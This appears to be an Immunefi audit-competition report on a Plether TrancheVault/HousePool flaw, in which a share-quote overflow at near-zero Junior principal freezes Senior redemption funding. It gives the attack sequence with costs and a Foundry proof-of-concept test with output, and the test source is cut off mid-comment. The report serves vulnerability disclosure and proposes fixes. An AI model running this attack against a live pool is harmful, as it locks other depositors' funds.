# \#98140 [SC-High] Junior Deposit Quote Overflow at Near-Zero Junior Principal in TrancheVault Lets an LP Freeze HousePool Redemption Funding

**Submitted on Nov 5th 2026 at 12:33:43 UTC by @zer0luck_xint for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98140
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

`HousePool._settleLpEpoch` funds matured redemptions before activating deposits. However, it does not reject a Junior deposit epoch whose share quote exceeds the available integer range. Repeated deposits priced against near-zero Junior principal can inflate Junior share supply until a later deposit quote reverts the entire settlement.

From then on, a queued Junior deposit epoch whose quote overflows makes every live-market LP epoch settlement that reaches the Junior deposit phase revert with Panic(0x11), and the Senior redemption funding that runs earlier in the same call is rolled back with it. A matured Junior deposit cannot be cancelled while Junior pricing assets are nonzero and Senior is unimpaired, so matured Senior redemptions stay unfunded and Junior deposit escrows stay locked. Without trading revenue, coupon depletion of the stored Junior residual allows settlement to skip Junior deposit activation. Trading revenue can keep the calculated Junior pricing assets nonzero after that point. Redemption funding can resume when the quote and mint become representable or when a pause, the Senior work limit, a Junior wipe, or an oracle-frozen window causes settlement to skip deposit activation.

## Vulnerability Details

**Settlement order.** By design, HousePool reconciles once, funds Senior redemptions before Junior redemptions, and then activates Junior deposits before Senior deposits (ACCOUNTING_SPEC.md:299-301). `_settleLpEpoch` performs all of these phases in one call frame:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L942

**Near-zero Junior principal is priced like any other.** Deposit activation is blocked for zero tranche NAV with nonzero supply (ACCOUNTING_SPEC.md:307-308). `_settleLpEpoch` skips the Junior deposit phase only when Junior pricing assets are exactly zero:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L914-L920

```solidity
        bool juniorActivationDeferred = juniorDepositPhase.pricingAssets == 0 && juniorDepositPhase.pricingSupply != 0;
        if (!juniorActivationDeferred) {
            juniorDepositPhase = _settleDepositPhase(juniorVault, result.cutoffEpoch, juniorDepositPhase, 0, false);
        }
```

With nonzero Junior pricing assets, `_settleDepositPhase` quotes the cumulative epoch through `quoteDepositFromState`. This function calls `Math.mulDiv` without first converting an unrepresentable result into a zero quote, so the arithmetic range check reverts instead of allowing epoch rejection:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1398-L1410

```solidity
        uint256 denominator = pricingAssets + assets + 1 - netAssets;
        shares = Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator, Math.Rounding.Floor);
```

Junior deposit requests have no size limit. `maxRequestDeposit` returns `type(uint256).max` for Junior unless the tranche is wiped or tranche deposits are closed (TrancheVault.sol:1313-1325), and `_canAcceptTrancheDeposits` closes Junior deposits for zero Junior principal with nonzero supply, not for near-zero principal (HousePool.sol:494-498).

**Junior share supply growth.** The Senior coupon is funded from Junior principal and capped by it (SECURITY.md:1186; ACCOUNTING_SPEC.md:345-351), so every reconcile moves the elapsed coupon out of Junior principal. A Junior deposit `a` priced at Junior principal `p` mints `floor(a * (supply + VIRTUAL_SHARES) / (p + 1))` share units. Here `a` and `p` are USDG base-unit amounts, and 1 atom equals 1e-6 USDG. `supply` is the current Junior share supply. `VIRTUAL_SHARES` is a constant set to `1000` share units. When `a` equals the coupon that accrues until the next settlement plus a few atoms, the next settlement again prices the following deposit at a few atoms of Junior principal, and the supply grows by a factor of about `a / p` per settlement. The deposits are paid to Senior LPs as coupon, and the minted shares are worth what was deposited, so the share price falls without any transfer of value to the depositor.

**The overflow reverts the whole settlement.** `Math.mulDiv` reverts with Panic(0x11) when the result does not fit in 256 bits, and `finalizeDepositEpochFromPool` mints the quoted shares with an overflow-checked `_mint` (TrancheVault.sol:1474). `_settleDepositPhase` already handles an epoch it cannot price: a zero quote rejects the epoch, and the depositors of a rejected epoch can cancel for a refund.

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1046-L1066

An unrepresentable quote reverts instead, and the revert rolls back the Senior and Junior redemption funding performed earlier in the same call. By design, redemption funding proceeds while entry activation is deferred (SECURITY.md:1388), and a pause of deposit activation does not block reconciled funding of matured redemptions (SECURITY.md:1150-1152). Here a deposit epoch that cannot be priced blocks that funding.

**The epoch stays at the head of the queue.** A matured Junior deposit can be cancelled only after rejection, a projected terminal wipe or Senior impairment, and the projected terminal wipe requires pricing assets of exactly zero:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851-L859

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1643-L1647

Later deposit epochs wait behind the head, and deposits requested for the same epoch are quoted together with it, which only enlarges the quote. A matured redemption cannot be cancelled either (TrancheVault.sol:894-896), so a redeeming LP waits for a settlement that succeeds.

**Trigger.** Deposit requests and LP epoch settlement are permissionless. With no open positions, any address can call `HousePool.settleLpEpoch` on the cached state (HousePool.sol:794-821), and `OrderRouter.settleLpEpoch` runs the same settlement body. The attacker uses only Junior deposit requests and permissionless settlement calls: hourly deposits that become Senior coupon, and one refundable deposit large enough to overflow.

## Impact Details

Severity: Medium, Temporary freezing of funds for at least 1 hour.

An LP can inflate Junior share supply through repeated deposits priced against near-zero Junior principal, then queue a deposit epoch whose share quote overflows. Each settlement that reaches this epoch reverts and rolls back redemption funding. Affected Senior LPs cannot claim their matured redemptions, and Junior depositors cannot recover their escrowed assets while the cancellation conditions remain unmet.

The freeze does not need the attacker to keep paying. Each attempt reconciles from the Junior principal stored at the last successful settlement: the coupon is capped by that stored principal, and revenue accrued since then is distributed after the coupon; with Senior at its high-water mark, all of it is credited to Junior (HousePoolReconcilePlanLib.sol:57-60, :95-99). Without revenue, Junior pricing assets reach zero once the coupon has consumed the stored residual, activation is deferred and the settlement succeeds. With revenue, Junior pricing assets stay above zero and the settlement keeps reverting until accrued revenue lifts Junior principal above the level at which the queued epoch's quote fits in 256 bits (11,859.31 USDG in the test) and its shares fit beside the existing supply.

In the release deployment with release parameters, the honest sequence and the attack start from the same pool state after the coupon drain and use the same request and settlement times. The honest sequence has no attacker deposits after the drain.

| | Honest sequence | Attack |
|---|---|---|
| Junior principal / Senior principal after the coupon drain | 101.42 / 5,001,188.52 | same |
| Hourly settlements of attacker Junior deposits before the trigger epoch | 0 | 24 |
| Settlement of Senior LP B's full redemption, Wed 2027-04-21 08:00:03 UTC | succeeds | reverts with Panic(0x11) |
| USDG Senior LP B receives from that settlement | 4,988,785.46 | 0.00 |
| Honest Junior LP E's 10,000.00 USDG deposit | request refused, Junior is wiped | locked, not cancellable |
| Attacker USDG spent, net | | 3,447.81 (1,286.93 top-up, 1.00 at the end of the coupon drain, 2,159.88 hourly and residual deposits) |
| Attacker refundable deposit | | 1,000,000.00 |

From the first failed settlement, the freeze ends as follows in each case:

| Continuation | First successful settlement | B's redemption unfunded | USDG B receives |
|---|---|---|---|
| No trading and no other action; the coupon consumes the 1,119.35 USDG residual | Thu 2027-04-22 09:00:03 UTC | 25 hours | 4,990,939.94 |
| A trader opens a 400,000-unit LONG at a basket price of 1.20 and closes at 1.203 each live morning; no other action | Fri 2027-04-23 21:00:45 UTC, oracle frozen | 61 hours 42 seconds | 4,978,462.59, after the frozen exit fee |
| An independent Senior LP requests a redemption in each of 16 consecutive epochs | Thu 2027-04-22 00:00:03 UTC | 16 hours | 4,990,552.49 |
| The owner calls `HousePool.pause()` | Wed 2027-04-21 09:00:03 UTC | 1 hour | 4,989,868.96 |
| A trader holds a LONG of 1,000,000 units and the basket moves from 1.20 to 1.195 | Wed 2027-04-21 08:01:10 UTC | 67 s | 3,801,888.82, limited by the reserve for the open position |

These settlements fund matured redemptions without removing the blocked Junior deposit epoch, so settlement reverts again once the oracle-frozen window ends, after `unpause`, or once the Senior redemption backlog falls below the work limit. Matured Junior deposits stay locked until Junior pricing assets reach zero or Senior is impaired: in the no-trading case E's 10,000.00 USDG cannot be cancelled at any attempt through Thu 2027-04-22 08:00:03 UTC. After the 24 hourly settlements, any Junior deposit epoch above 95,329.32 USDG overflows, including an honest one.

The continuations correspond to these mechanisms. Deposit activation does not run while the oracle is frozen, so a frozen-window settlement funds redemptions with the frozen exit fee (HousePool.sol:908-912, :1143). Settlement returns before deposit activation when Senior redemption processing reaches the constant `MAX_LP_EPOCHS_PER_PHASE` limit of 16 and a Senior backlog remains (HousePool.sol:869-875). A pause skips deposit activation (HousePool.sol:903-907). An open position's marked profit above the Junior residual takes Junior pricing assets to zero; the trader's profit above the residual is charged to Senior principal, and the time needed depends on the basket moving by at least the residual divided by the position size.

Prerequisites:
- The attacker needs Junior principal close to depletion by the Senior coupon while Senior principal remains positive. The coupon is funded only from Junior principal and capped by it (SECURITY.md:1186, :1391). Junior depletion through coupon payments is a supported protocol state (WHITEPAPER.md:1617). When Senior is at its share limit, the withdrawal check prevents Junior redemptions that would breach that limit (ACCOUNTING_SPEC.md:442-443).
- For about 1 day (24 hourly settlements), Junior principal changes only through the coupon and the attacker's deposits: no net open units, no trading revenue or fees, and no other Junior deposits. Each of these settlements runs within the first 10 seconds of its epoch; settlement is permissionless, so the attacker can submit it, and each deposit is sized from stored state before the settlement second is known.
- The sequence also works with an open book whose units net to zero. Reconciliation adds the book's marked price delta to distributable value (HousePoolAccountingLib.sol:60-78), and that delta is a sum of per-position lines whose LONG and SHORT slopes cancel when the units match (TerminalNavBookV2.sol:349, :580-598), so while both positions stay open and neither trader's marked loss exceeds its pledged margin, the mark does not move Junior principal. The attacker can therefore offset an open book with a position of its own, opened before the hourly settlements: with a background LONG of 400,000 basket units held open and an attacker SHORT of the same size, the same deposit sizing takes the Junior share supply from about 2^51 to about 2^249 in 25 settlements, and the next 25 hourly `OrderRouter.settleLpEpoch` calls revert with Panic(0x11) while Senior LP B stays unfunded (`test_offsetOpenBookDoesNotPreventFreeze`).
- The hourly settlements and the freeze fall inside the live market window, because deposit activation does not run while the oracle is frozen. The attacker first deposits 1,286.93 USDG of Junior principal so that the end of the coupon drain falls on a Tuesday.
- No privileged role, oracle premise or basket move is involved. A pause by the owner or pauser, a manual emergency action, lets settlements fund matured redemptions while it lasts; it does not release matured Junior deposits, and the next settlement after unpause reverts again.

## Recommendation

The defect occurs because `quoteDepositFromState` propagates an overflow revert instead of returning zero for an unrepresentable deposit quote. Before calling `Math.mulDiv`, use `Math.mul512` to return zero when the product's high word is at least `denominator`. Also return zero when the quoted shares exceed `type(uint256).max - (pricingSupply + VIRTUAL_SHARES)`. The existing zero-share branch can then reject the epoch, allowing depositors to recover their assets through `cancelPendingDeposit`. Treating Junior principal below a dust threshold relative to its share supply like a wiped tranche, in both the activation check of `_settleLpEpoch` and `_projectedTerminalWipe`, also removes the repeated pricing at a few atoms of principal that inflates the supply.

## References

- Audit commit: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8
- LP epoch settlement order and deposit activation conditions: `packages/perps/ACCOUNTING_SPEC.md:299-308`
- Senior coupon funded from Junior principal: `packages/perps/SECURITY.md:1183-1188`, `packages/perps/ACCOUNTING_SPEC.md:345-351`
- Redemption funding while entry activation is deferred, and pool pause: `packages/perps/SECURITY.md:1150-1152`, `:1380-1395`
- Historical replay of tranche principal: `packages/perps/WHITEPAPER.md` section 8.6
- Release parameters: `packages/perps/DEPLOYMENT.md` (Initial release parameters) and `script/DeployPerpsArbitrumSepolia.s.sol`

## Proof of Concept

## Proof of Concept

The test deploys the release contracts with `script/DeployPerpsArbitrumSepolia.s.sol` inside Forge. In-scope contracts are unmodified. Only out-of-scope components are mocked:
- Pyth: the repository's `test/mocks/MockPyth.sol`, etched at the release Pyth address.
- USDG: the release `MockUSDG`.
- The ArbSys block-number precompile.

The PoC is a single file with 2 tests. Steps in `test_juniorQuoteOverflowFreezesSeniorRedemptionFunding`, all through public entry points:
1. Junior LP A deposits 1,000,000 USDG, and Senior LPs B and D deposit 3,990,000 and 10,000 USDG, which brings Senior to 3 USDG below the 80% share limit (each tranche also holds a 1 USDG seed position). No position is opened.
2. The attacker deposits 1,286.93 USDG of Junior principal so that the end of the coupon drain falls on a Tuesday. After 3.1 years of coupon, a 1 USDG Junior deposit by the attacker settles and leaves Junior principal at 101.42 USDG, about 2 hours of coupon. The test takes a snapshot.
3. Attack: for 24 consecutive epochs the attacker requests a Junior deposit 10 minutes before the epoch starts, sized from stored pool state and the test's fixed parameters. An address with no role (the test's `keeper`) settles each epoch at a second within the first 10 seconds that the sizing does not use. The test checks that every mint equals `deposit * (supply + 1000) / (principal + 1)`.
4. For the next epoch, B requests redemption of all its Senior shares, honest Junior LP E requests a 10,000 USDG deposit, and the attacker requests a 1,000,000 USDG Junior deposit.
5. 3 seconds after that epoch starts, `HousePool.settleLpEpoch` and `OrderRouter.settleLpEpoch` both revert with Panic(0x11). B cannot cancel its redemption, and E and the attacker cannot cancel their deposits.
6. From a snapshot of that state, 5 continuations run: (a) hourly settlement attempts with no other action until one succeeds, each failure checking the Panic(0x11) revert data, B's pending shares, nothing claimable for B, no USDG reaching the Senior vault and E unable to cancel; (b) Senior LP D requests a redemption of 1/20 of its shares in each of 16 epochs; (c) the owner calls `HousePool.pause()` 1 hour later and `unpause()` after the settlement; (d) a trader opens a LONG of 1,000,000 basket units at 1.20; a settlement attempt at 1.20 still reverts, and the attempt 60 seconds later runs at a basket of 1.195; (e) every live day at 09:00 UTC a trader opens a LONG of 400,000 basket units at 1.20 and closes it at 1.203, with hourly settlement attempts until one succeeds, followed by Senior LP D's redemption request for the next live Monday 10:00 UTC epoch.
7. Honest sequence: from the snapshot of step 2, B's redemption request and the settlement happen at the same times without any attacker deposit; E's deposit request is refused because the coupon has wiped Junior.

`test_offsetOpenBookDoesNotPreventFreeze` repeats the funding and coupon drain of steps 1-2, then opens a background LONG of 400,000 basket units and an attacker SHORT of the same size, so the open book has no net units. From then on every settlement refreshes the mark through `OrderRouter.settleLpEpoch` along a fixed hourly basket path, and a stale mark is refreshed at the last price through `OrderRouter.updateMarkPrice` before each LP request. A preliminary settlement with an additional attacker Junior deposit reconciles the pool after the 2 opens. The test then runs the collapse of step 3, which checks the same mint formula at each of its 25 settlements, and the trigger epoch of step 4, and checks that every failed attempt reverts with Panic(0x11) while B has nothing claimable.

On a fresh clone of the audit commit, run `git submodule update --init --recursive`. Create `test/poc/` at the repository root, place `JuniorNearWipeQuoteOverflow.t.sol` (source at the end of this section) in it, then run from the repository root with Forge 1.5.1:

```bash
forge test --match-path test/poc/JuniorNearWipeQuoteOverflow.t.sol -vv
```

Excerpt from the output of the command above (deployment lines omitted; the coupon-drain and per-settlement lines are excerpted below):

```
[PASS] test_juniorQuoteOverflowFreezesSeniorRedemptionFunding() (gas: 73849248)
Logs:
  ATTACK: collapse settlements 24
  ATTACK: Junior principal left for the next settlement 1165055211
  ATTACK: Junior deposit epoch assets (E + attacker) 1010000000000
  ATTACK: Junior principal at pricing (atoms) 1119346866
  ATTACK: Junior share supply 1359618558597628650065905645519250190994657627832183014719565118843962342327
  ATTACK: Junior epoch assets above which the quote overflows at this state 95329319750
  ATTACK: Junior principal above which the 1,010,000 USDG epoch quote fits 11859313993
  ATTACK: HousePool.settleLpEpoch and OrderRouter.settleLpEpoch revert with
  0x4e487b710000000000000000000000000000000000000000000000000000000000000011
  ATTACK: first failed settlement at 1808294403
      UTC weekday (0 = Sunday) / hour / second of hour 3 8 3
  ATTACK: B cannot cancel its matured redemption; E and the attacker cannot cancel their deposits
  NO OTHER ACTION: consecutive failed hourly settlements 25
  NO OTHER ACTION: last failed settlement at 1808380803
      UTC weekday (0 = Sunday) / hour / second of hour 4 8 3
  NO OTHER ACTION: first successful settlement at 1808384403
      UTC weekday (0 = Sunday) / hour / second of hour 4 9 3
  NO OTHER ACTION: seconds from the first to the last failed settlement 86400
  NO OTHER ACTION: seconds B's matured redemption stays unfunded 90000
  NO OTHER ACTION: Junior principal at the successful settlement 0
  NO OTHER ACTION: USDG Senior LP B receives 4990939939373
  NO OTHER ACTION: E's deposit refunded after the Junior wipe 10000000000
  NO OTHER ACTION: attacker's deposit refunded after the Junior wipe 1000000000000
  attacker USDG deposited in total 1003447811660
      of which top-up that places the end of the coupon drain on a Tuesday 1286930897
      of which collapse and residual deposits 2159880763
  attacker net USDG cost (paid to Senior as coupon) 3447811660
  SENIOR LP D QUEUES HOURLY REDEMPTIONS: first successful settlement at 1808352003
      UTC weekday (0 = Sunday) / hour / second of hour 4 0 3
  SENIOR LP D QUEUES HOURLY REDEMPTIONS: seconds B's redemption stays unfunded 57600
  SENIOR LP D QUEUES HOURLY REDEMPTIONS: USDG Senior LP B receives 4990552491105
  SENIOR LP D QUEUES HOURLY REDEMPTIONS: the next settlement reverts again
  PAUSE: USDG Senior LP B receives one hour after the first failed settlement 4989868959900
  PAUSE: after unpause the next settlement reverts again
  TRADER POSITION: first successful settlement at 1808294470
      UTC weekday (0 = Sunday) / hour / second of hour 3 8 70
  TRADER POSITION: seconds B's redemption stays unfunded 67
  TRADER POSITION: Junior principal after the settlement 0
  TRADER POSITION: Senior principal / high-water mark after the settlement 1198000000000 1198585235105
  TRADER POSITION: USDG Senior LP B receives 3801888818799
  REVENUE: time at which the coupon alone would consume the stored Junior principal 1808382612
      UTC weekday (0 = Sunday) / hour / second of hour 4 8 1812
  REVENUE: losing round trips by the trader 3
  REVENUE: consecutive failed hourly settlements 61
  REVENUE: first successful settlement at 1808514045
      UTC weekday (0 = Sunday) / hour / second of hour 5 21 45
  REVENUE: oracle frozen at the successful settlement true
  REVENUE: seconds B's matured redemption stays unfunded 219642
  REVENUE: Junior principal after the settlement 4177441411
  REVENUE: USDG Senior LP B receives 4978462589524
  REVENUE: E still cannot cancel its deposit
  REVENUE: after the weekend, Senior LP D's redemption settlement reverts again at 1808733603
      UTC weekday (0 = Sunday) / hour / second of hour 1 10 3
  HONEST SEQUENCE: Junior principal is zero, E's deposit request is refused (TrancheVault__TerminallyWiped)
  HONEST SEQUENCE: settlement at 1808294403
      UTC weekday (0 = Sunday) / hour / second of hour 3 8 3
  HONEST SEQUENCE: USDG Senior LP B receives at the first settlement 4988785458850
```

Excerpt from the same output for `test_juniorQuoteOverflowFreezesSeniorRedemptionFunding`: the pool after the coupon drain and the first 3 and last 2 of the 24 hourly settlements of attacker deposits:

```
  Junior principal after the coupon drain 101415092
  Senior principal after the coupon drain 5001188515805
  Junior share supply after the coupon drain 1011268568472696
  settlement 1 second of hour 0
      Junior principal at pricing (atoms) / attacker deposit (atoms) 55780199 1000000
      Junior share supply after 1029398094155172
  settlement 2 second of hour 7
      Junior principal at pricing (atoms) / attacker deposit (atoms) 11018019 34719208
      Junior share supply after 4273164809573343
  settlement 3 second of hour 4
      Junior principal at pricing (atoms) / attacker deposit (atoms) 101500 45674207
      Junior share supply after 1927144999152231287
  settlement 23 second of hour 4
      Junior principal at pricing (atoms) / attacker deposit (atoms) 101519 49923346
      Junior share supply after 5111907176654244410133235957707973643338650930604398538251745079247306666
  settlement 24 second of hour 1
      Junior principal at pricing (atoms) / attacker deposit (atoms) 4380385 1160674826
      Junior share supply after 1359618558597628650065905645519250190994657627832183014719565118843962342327
```

Excerpt from the same output for `test_offsetOpenBookDoesNotPreventFreeze` (deployment and per-settlement lines omitted):

```
[PASS] test_offsetOpenBookDoesNotPreventFreeze() (gas: 51940893)
Logs:
  OFFSET BOOK: open interest LONG / SHORT (units, 18 decimals) 400000000000000000000000 400000000000000000000000
  OFFSET BOOK: after the coupon drain and the 2 opens
      Junior principal / Senior principal 101415092 5001188515805
      Junior share supply (log2) 49
  OFFSET BOOK: collapse settlements 25
  OFFSET BOOK: Junior share supply log2 before / after 51 249
  OFFSET BOOK: consecutive OrderRouter.settleLpEpoch attempts reverting with Panic(0x11) 25
  OFFSET BOOK: first successful settlement timestamp (0 = none in the window) 1808391603
  OFFSET BOOK: hours from the trigger epoch to the first successful settlement 25
  OFFSET BOOK: Junior principal after the first successful settlement 0
  OFFSET BOOK: Senior LP B claimable redemption shares 3615248280496272

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 134.30ms (220.33ms CPU time)
```

### Source files

#### `JuniorNearWipeQuoteOverflow.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {DeployPerpsArbitrumSepolia} from "../../script/DeployPerpsArbitrumSepolia.s.sol";
import {MockPyth} from "../mocks/MockPyth.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {Test, console2} from "forge-std/Test.sol";

// Release deployment fixture: deploys the release contracts with script/DeployPerpsArbitrumSepolia.s.sol inside
// the local Forge EVM, as test/scripts/MockUSDGPerpsLifecycle.t.sol does: release wrappers (Senior cap 40M/80%),
// release risk and pool parameters (8% Senior coupon, hourly LP epochs with a 300 s request cutoff), six Pyth feeds.
// Only out-of-scope components are mocked: Pyth (MockPyth etched at the release Pyth address), USDG (the release
// MockUSDG), ArbSys (address(100)).

/// @dev Mirrors the Arbitrum precompile's block-number view inside the local test EVM.
contract ReleaseFixtureArbSys {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

abstract contract ReleaseFixture is Test {

    address internal constant RELEASE_PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
    uint256 internal constant DEPLOYER_KEY = 0xA11CE;
    uint256 internal constant MONDAY_MORNING = 1_709_532_000; // Mon 2024-03-04 06:00 UTC (live market)
    uint256 internal constant BASKET_1_20 = 120_000_000; // normalized basket mark 1.20 (8 decimals)

    DeployPerpsArbitrumSepolia.DeployedContracts internal d;
    address internal owner;
    address internal keeper = makeAddr("keeper");

    function setUp() public virtual {
        vm.chainId(421_614);
        vm.warp(MONDAY_MORNING);
        ReleaseFixtureArbSys arbSys = new ReleaseFixtureArbSys();
        vm.etch(address(100), address(arbSys).code);
        MockPyth pyth = new MockPyth();
        vm.etch(RELEASE_PYTH, address(pyth).code);
        vm.setEnv("TEST_PRIVATE_KEY", vm.toString(DEPLOYER_KEY));
        d = DeployPerpsArbitrumSepolia(deployCode("DeployPerpsArbitrumSepolia.s.sol:DeployPerpsArbitrumSepolia")).run();
        owner = vm.addr(DEPLOYER_KEY);

        // Permanent 1 USDG seed positions per tranche (release values), then activation.
        d.settlementToken.mint(owner, 2e6);
        vm.startPrank(owner);
        d.settlementToken.approve(address(d.housePool), 2e6);
        d.housePool.initializeSeedPosition(false, 1e6, owner);
        d.housePool.initializeSeedPosition(true, 1e6, owner);
        d.housePool.activateTrading();
        vm.stopPrank();

        _setBasketPrices(BASKET_1_20);
        d.router.updateMarkPrice(_updateData());
    }

    function _setBasketPrices(
        uint256 basketPrice
    ) internal {
        lastSetPrice = basketPrice;
        PletherOracle oracle = PletherOracle(d.pletherOracle);
        for (uint256 i; i < 6; ++i) {
            uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
            uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
            MockPyth(RELEASE_PYTH)
                .setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), int32(-8), vm.getBlockTimestamp());
        }
    }

    /// @dev A non-encoded payload makes the MockPyth double use the configured per-feed prices.
    function _updateData() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _warp(
        uint256 dt
    ) internal {
        vm.warp(vm.getBlockTimestamp() + dt);
        vm.roll(vm.getBlockNumber() + 1 + dt / 4);
    }

    function _warpTo(
        uint256 t
    ) internal {
        uint256 nowTs = vm.getBlockTimestamp();
        require(t >= nowTs, "warp back");
        vm.roll(vm.getBlockNumber() + 1 + (t - nowTs) / 4);
        vm.warp(t);
    }

    function _vault(
        bool senior
    ) internal view returns (TrancheVault) {
        return senior ? d.seniorVault : d.juniorVault;
    }

    function _requestDeposit(
        bool senior,
        address lp,
        uint256 assets
    ) internal returns (uint256 requestId) {
        TrancheVault v = _vault(senior);
        _refreshMarkIfNeeded();
        d.settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        d.settlementToken.approve(address(v), assets);
        requestId = v.requestDeposit(assets, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(
        bool senior,
        address lp,
        uint256 requestId
    ) internal returns (uint256 shares) {
        TrancheVault v = _vault(senior);
        uint256 claimable = v.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        shares = v.claimDeposit(requestId, claimable, lp, lp);
    }

    function _requestRedeem(
        bool senior,
        address lp,
        uint256 shares
    ) internal returns (uint256 requestId) {
        _refreshMarkIfNeeded();
        vm.prank(lp);
        requestId = _vault(senior).requestRedeem(shares, lp, lp);
    }

    function _claimRedeem(
        bool senior,
        address lp,
        uint256 requestId
    ) internal returns (uint256 assets) {
        TrancheVault v = _vault(senior);
        uint256 shares = v.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        assets = v.claimRedeem(requestId, shares, lp, lp);
    }

    function _fundTrader(
        address trader,
        uint256 assets
    ) internal {
        d.settlementToken.mint(trader, assets);
        vm.startPrank(trader);
        d.settlementToken.approve(address(d.clearinghouse), assets);
        d.clearinghouse.depositMargin(assets);
        vm.stopPrank();
    }

    /// @dev Permissive bounds: no practical ceilings.
    function _openReq(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice
    ) internal view returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = keccak256(abi.encode("open", size, vm.getBlockTimestamp()));
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = targetPrice;
        r.isClose = false;
        r.bounds.submitBy = uint64(vm.getBlockTimestamp() + 60);
        r.bounds.executionWindowSeconds = 60;
        r.bounds.allowedExecutionModes = 1 | 2; // live and FAD
        r.bounds.expectedConfigHash = d.lifecycleBook.currentExecutionConfigHash();
        r.bounds.maxExecutionBountyAssets = type(uint256).max;
        r.bounds.maxExecutionNotionalAssets = type(uint256).max;
        r.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        r.bounds.maxActionChargeAssets = type(uint256).max;
        r.bounds.maxExplicitFeesAssets = type(uint256).max;
        r.bounds.maxPostPositionSize = type(uint256).max;
        r.bounds.maxPostLeverageBps = type(uint32).max;
    }

    /// @dev Commits a LONG open, advances 7 s / 2 blocks, publishes `basketPrice` and executes as an address with no role.
    function _openLong(
        address trader,
        uint256 size,
        uint256 margin,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        OrderV3Types.OrderRequest memory req = _openReq(CfdTypes.Side.LONG, size, margin, 1);
        vm.prank(trader);
        uint64 id = d.router.commitOrder(req);
        vm.warp(vm.getBlockTimestamp() + 7);
        vm.roll(vm.getBlockNumber() + 2);
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        result = d.router.executeOrder(id, _updateData());
    }

    /// @dev Commits a full LONG close, advances 7 s / 2 blocks, publishes `basketPrice` and executes as an address with
    ///      no role.
    function _closeLong(
        address trader,
        uint256 size,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        OrderV3Types.OrderRequest memory req = _openReq(CfdTypes.Side.LONG, size, 0, basketPrice * 2);
        req.isClose = true;
        req.bounds.allowedExecutionModes = 7;
        vm.prank(trader);
        uint64 id = d.router.commitOrder(req);
        vm.warp(vm.getBlockTimestamp() + 7);
        vm.roll(vm.getBlockNumber() + 2);
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        result = d.router.executeOrder(id, _updateData());
    }

    uint256 internal lastSetPrice = BASKET_1_20;

    /// @dev With open positions, LP requests need a fresh mark; refresh at the last basket price when it is stale.
    function _refreshMarkIfNeeded() internal {
        (, uint256 oiL,,) = d.engine.sides(0);
        (, uint256 oiS,,) = d.engine.sides(1);
        if (oiL + oiS == 0) return;
        if (uint256(d.engine.lastMarkTime()) + 30 > vm.getBlockTimestamp()) return;
        _setBasketPrices(lastSetPrice);
        vm.prank(keeper);
        d.router.updateMarkPrice(_updateData());
    }

    function _usdgOf(
        address a
    ) internal view returns (uint256) {
        return d.settlementToken.balanceOf(a);
    }

}


/// @notice Junior deposits are priced at `juniorPrincipal + 1` whenever Junior principal is nonzero. When the Senior
///         coupon has drained Junior principal to a few atoms, an LP can queue a Junior deposit each hour sized so
///         that the next settlement's coupon leaves Junior principal at a few atoms again. Each such settlement mints
///         about `deposit / juniorPrincipal` times the existing Junior share supply. After 24 hourly settlements
///         in this test `TrancheVault.quoteDepositFromState` overflows (Panic 0x11) for a Junior deposit epoch above
///         about 95,000 USDG, and
///         `HousePool._settleLpEpoch` reverts as a whole, including the Senior redemption funding that runs before the
///         deposit phase. A matured Junior deposit cannot be cancelled while Junior principal is nonzero, so the
///         overflowing epoch stays at the head of the deposit queue.
///
///         The test uses the release deployment script (script/DeployPerpsArbitrumSepolia.s.sol) and public calls only.
///         In the main test no positions are open, so `HousePool.settleLpEpoch` is permissionless; `OrderRouter.settleLpEpoch`
///         is tried as well. Each settlement lands at a varying second within the first 10 seconds of its epoch, and the attacker
